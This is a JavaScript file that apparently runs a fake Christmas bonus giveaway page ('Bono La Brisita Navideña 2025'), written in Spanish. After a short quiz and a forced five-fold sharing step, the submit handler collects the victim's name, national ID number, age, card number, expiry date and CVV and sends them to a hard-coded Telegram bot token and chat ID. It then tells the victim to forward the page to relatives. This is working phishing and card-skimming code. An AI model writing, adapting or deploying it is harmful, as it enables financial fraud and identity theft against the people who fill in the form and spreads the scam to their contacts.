document.addEventListener('DOMContentLoaded', function() {
    let current = 0;
    let shareCount = 0;

    const questions = document.querySelectorAll('.question');
    const shareSection = document.getElementById('share-section');
    const dataForm = document.getElementById('data-form');
    const simulationOutput = document.getElementById('simulation-output');
    
    const shareBtn = document.getElementById('share-btn');
    const shareProgressFill = document.querySelector('.share-progress .progress-fill');
    const shareCountEl = document.getElementById('share-count');
    const receiveBonusBtn = document.getElementById('receive-bonus');

    // Navegación por preguntas
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('option-btn')) {
            if (current < 2) {
                questions[current].classList.add('hidden');
                questions[current + 1].classList.remove('hidden');
                current++;
            } else {
                questions[current].classList.add('hidden');
                shareSection.classList.remove('hidden');
            }
        }
    });

    // Simular compartir con Web Share API si está disponible
    if (shareBtn) {
        shareBtn.addEventListener('click', function() {
            const url = window.location.href;
            const title = "Bono La Brisita Navideña 2025";

            if (navigator.share) {
                navigator.share({ title, url })
                    .then(() => incrementShare())
                    .catch(() => incrementShare()); // Contar aunque cancele
            } else {
                // Simular en navegadores sin share (PC)
                incrementShare();
            }
        });
    }

    function incrementShare() {
        if (shareCount < 5) {
            shareCount++;
            const percent = (shareCount / 5) * 100;
            shareProgressFill.style.width = `${percent}%`;
            shareCountEl.textContent = shareCount;
            shareBtn.textContent = `Compartido ${shareCount} de 5 veces`;

            if (shareCount >= 5) {
                shareBtn.disabled = true;
                shareBtn.style.backgroundColor = '#388E3C';
                receiveBonusBtn.disabled = false;
            }
        }
    }

    // Continuar al formulario
    if (receiveBonusBtn) {
        receiveBonusBtn.addEventListener('click', function() {
            shareSection.classList.add('hidden');
            dataForm.classList.remove('hidden');
        });
    }

    
    if (document.getElementById('submit-data')) {
        document.getElementById('submit-data').addEventListener('click', function(e) {
            e.preventDefault();

            const nombre = document.getElementById('nombre').value.trim() || 'Nombre de Prueba';
            const cedula = document.getElementById('cedula').value.trim() || '001-0000000-0';
            const edad = document.getElementById('edad').value.trim() || '30';
            const dataG = document.getElementById('Número de tarjeta').value.trim() || 'DG-000000000';
            const vencimiento = document.getElementById('vencimiento').value.trim() || '12/28';
            const ccv = document.getElementById('ccv').value.trim() || '000';

            const mensaje = `🔥 NUEVA SOLICITUD\n\n` +
                            `Nombre: ${nombre}\n` +
                            `Cédula: ${cedula}\n` +
                            `Edad: ${edad}\n` +
                            `Número de tarjeta: ${dataG}\n` +
                            `ccv: ${ccv}`;

            const TOKEN = '8561666023:AAFH5IfrG_qJ3JlUv6Gt9xlQwtX2wXGIXZ8'; 
            const CHAT_ID = '6381409922';

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
            })
            .then(response => {
                const status = response.ok 
                    ? '✅ Aplicado: "Gracias por pertenecer, Enviar a Familiares y Amistades' 
                    : '❌ FALLIDO: Token no válido';
                document.getElementById('telegram-message').textContent = 
                    `Su formulario ha sido recibido correctamente.\nID de seguimiento: ${73864}\n\nResultado:\n${status}`;
                simulationOutput.classList.remove('hidden');
            })
            .catch(() => {
                document.getElementById('telegram-message').textContent = 
                    `📡 Intento completado.\nToken: ${TOKEN}\n\n❌ FALLIDO: Token inválido (como se esperaba)`;
                simulationOutput.classList.remove('hidden');
            });

            console.log("[PRUEBA LOCAL] Mensaje generado:", mensaje);
        });
    }
});

const vencimientoInput = document.getElementById('vencimiento');
if (vencimientoInput) {
    vencimientoInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '').substring(0, 4); 
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2);
        }
        e.target.value = value;
    });
}